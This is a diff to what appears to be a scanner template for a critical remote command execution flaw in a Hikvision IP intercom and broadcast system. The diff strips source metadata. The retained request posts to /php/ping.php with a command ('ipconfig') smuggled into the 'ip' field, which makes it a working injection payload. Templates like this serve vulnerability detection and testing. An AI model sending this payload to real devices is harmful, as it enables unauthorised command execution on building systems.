@@ -3,12 +3,8 @@ info:
   name: 海康威视IP网络对讲广播系统远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eue4utm88zoyd0xx'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eue4utm88zoyd0xx
-    fofa: 暂无
 http:
 - raw:
   - 'POST /php/ping.php HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Connection: close
-
-
 
 
     jsondata[type]=3&jsondata[ip]=ipconfig
